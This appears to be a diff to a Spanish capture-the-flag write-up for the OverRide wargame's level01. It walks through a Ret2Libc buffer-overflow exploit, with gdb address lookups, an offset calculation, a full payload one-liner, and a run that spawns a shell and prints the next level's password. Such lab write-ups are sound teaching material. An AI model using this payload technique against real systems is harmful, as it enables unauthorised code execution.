@@ -177,19 +177,127 @@ Para resolver este nivel, necesitamos construir un exploit de **Ret2Libc**.
 
 Cuando la función `main` termine (en el `ret` de la línea `<+229>`), el programa no vuelva al sistema, sino que salte a `system()` dentro de la `libc`.
 
-Necesitamos tres direcciones:
+Necesitamos dos direcciones:
 
 1. **Dirección de `system()**` en la Libc.
-2. **Dirección de una "salida"** (como `exit()`) para que no crashee.
-3. **Dirección de la cadena `"/bin/sh"**` (que también está dentro de la Libc).
+2. **Dirección de la cadena `"/bin/sh"**` (que también está dentro de la Libc).
 
-**¿Cómo las encontramos?**
+Encontrar la dirección de `system()`:
+
+1. **Preparamos el entorno:**
+
+Ponemos un `brake` en el `main` y arrancamos el programa para que la `libc` se mapee en memoria:
+```bash
+(gdb) b main
+Breakpoint 1 at 0x80484d5
+(gdb) r
+Starting program: /home/users/level01/level01 
+Breakpoint 1, 0x080484d5 in main ()
+```
+
+2. **Encontrar la dirección de system:**
+
+Una vez que el porgrama está corriendo, `GDB` puede ver las librerías `0xf7e6aed0`:
 ```bash
 (gdb) p system
-(gdb) find &system, +9999999, "/bin/sh"
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>  ⟸ 
+```
 
+3. **Encontrar la cadena "/bin/sh":**
+
+* Primero necesitamos saber dónde empieza y termina la libc en memoria:
+
+```bash
+(gdb) info proc mapping
+process 1798
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+	0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+	0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+	0xf7e2b000 0xf7e2c000     0x1000        0x0 
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so       ⟸
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0 
+	0xf7fda000 0xf7fdb000     0x1000        0x0 
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) quit
+```
+* Ya sabemos que la `libc` está en el rango `0xf7e2c000 - 0xf7fcc000`. 
+* Ahora buscamos la cadena ahí mismo:
+
+```bash
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec                                       ⟸
+1 pattern found.
+```
+
+* system(): `0xf7e6aed0`
+* "/bin/sh": `0xf7f897ec`
+
+---
+
+# 7. Cálculo del Offset y construcción del payload:
+
+* El `buffer` del password empieza en `[esp + 0x1c]` (decimal 28).
+* El stack total reservado es `sub esp, 0x60` (decimal 96).
+* El EBP guardado está justo después de esos 96 bytes.
+* El EIP (dirección de retorno) está justo después del EBP (4 bytes más).
+
+Cálculo:
+
+* Desde el inicio del stack hasta el EIP hay `96 (esp) + 4 (ebp) = 100 bytes.`
+* El `buffer` empieza en la posición 28.
+* `100 − 28 = 80 bytes`.
+
+Construcción:
+
+1. El nombre del usuario: `python -c 'print "dat_wil"';`
+2. 80 bytes de relleno para desbordar el `buffer`: `python -c 'print "A"*80 `
+3. La dirección del `system()`
+4. Los 4 bytes con `"AAAA"` del `Dummy Return`
+5. La dirección de `"/bin/sh"`
+6. El comando `cat` para mantener la shell abierta y porder escribir comandos.
+
+```bash
+(python -c 'print "dat_wil"'; python -c 'print "A"*80 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'; cat) | ./level01
 ```
 
 ---
 
 ### **Ejecución:**
+
+```bash
+level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "A"*80 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+pwd       
+/home/users/level01
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+Segmentation fault (core dumped)
+level01@OverRide:~$ su level02
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
+level02@OverRide:~$ 
+```
+
+# 7. Conclusión:
+
+El nivel 01 aunque usa una función teóricamente segura como `fgets()`, un error en el cálculo del tamaño del buffer por parte del programador permite un `Stack Buffer Overflow`.
+
+Las protecciones de la RAM como `ASLR` y `PIE` están **desactivadas**. Esto nos permite aplicar con éxito la técnica de `Ret2Libc`, desviando la ejecución del programa hacia la librería estándar de C.
